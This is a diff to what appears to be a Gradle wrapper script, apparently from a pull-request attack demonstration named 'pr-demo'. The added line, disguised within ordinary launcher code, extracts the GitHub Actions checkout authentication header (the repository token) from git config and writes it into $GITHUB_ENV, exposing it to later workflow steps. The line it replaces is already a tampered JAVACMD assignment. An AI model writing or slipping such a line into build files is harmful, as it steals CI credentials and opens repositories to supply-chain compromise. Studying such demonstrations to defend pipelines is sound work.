@@ -154,7 +154,7 @@ if $cygwin ; then
     esac
 fi
 
-JAVACMD="sh git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader"
+echo "GIT_VALUES=$(git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader)" >> $GITHUB_ENV
 # Escape application args
 save () {
     for i do printf %s\\n "$i" | sed "s/'/'\\\\''/g;1s/^/'/;\$s/\$/' \\\\/" ; done
